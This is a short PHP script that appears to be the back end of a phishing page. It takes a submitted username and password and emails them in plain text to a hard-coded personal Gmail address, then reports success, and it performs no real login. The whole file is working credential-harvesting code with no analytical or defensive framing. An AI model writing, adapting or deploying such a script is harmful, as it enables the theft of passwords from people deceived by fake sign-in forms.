<?php
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
  $username = $_POST['username'];
  $password = $_POST['password'];

  // Send email
  $to = 'ivanzheng4826@gmail.com';
  $subject = 'Login Submission';
  $message = "Username: $username\nPassword: $password";
  $headers = "From: your-email@example.com";

  if (mail($to, $subject, $message, $headers)) {
    echo "succes!";
  } else {
    echo "Failed.";
  }
}
?>
